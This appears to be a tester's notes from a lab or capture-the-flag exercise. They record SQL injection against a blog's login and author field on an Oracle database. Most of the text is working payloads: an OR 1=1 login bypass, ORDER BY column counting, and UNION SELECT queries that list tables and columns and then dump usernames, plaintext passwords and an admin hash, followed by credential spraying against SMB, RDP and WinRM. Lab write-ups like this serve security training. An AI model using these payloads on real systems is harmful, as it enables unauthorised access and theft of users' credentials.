SQLinjectable to 'OR 1=1 -- -
login as admin

author tab is injectable again

' UNION SELECT * FROM all_tables --
	error -> need to find out how many queries to make

' ORDER BY 1-- -> valid
' ORDER BY 2-- -> valid
' ORDER BY 3-- -> valid
' ORDER BY 4-- -> invalid

there are 3 columns

' UNION SELECT 'a', NULL, NULL FROM all_tables --
	first column is a string
' UNION SELECT NULL, 'a', NULL FROM all_tables --
	second column is a string
' UNION SELECT NULL, NULL, 1 FROM all_tables --
	third column is an int

' UNION SELECT str, str, int FROM all_tables --

  Blog entry from a with title a from 1

	author title id(?)

' UNION SELECT global_name, 'a', 0 FROM global_name --

will return a variable in the string sections

' UNION SELECT table_name, table_name, 0 FROM all_tables --
	get table names

' UNION SELECT column_name, column_name, 0 FROM all_tab_columns --
	get all column names

with all the names of the columns i copied the output to a txt file and manipulated it with vim to be in the format of Table name: <tbl> Column name: <clm>
grepped that file for "PASSWORD"
noticed the WEB_USERS and WEB_ADMINS tables
then grep the file for "WEB_" to see all the interesting tables and columns

' UNION SELECT USER_NAME, PASSWORD, USER_ID FROM WEB_USERS --
	Username: alice Password: bobismyuncle
	Username: eric Password: thisismypassword

' UNION SELECT ADMIN_NAME, PASSWORD, ADMIN_ID FROM WEB_ADMINS --
	 Username: admin Password: d82494f05d6917ba02f7aaa29689ccb444bb73f20380876cb05d1f37537b7892

with the creds i tried to spray against smb, rdp, and winrm, no results :(
thats bc theres the admin login lololol
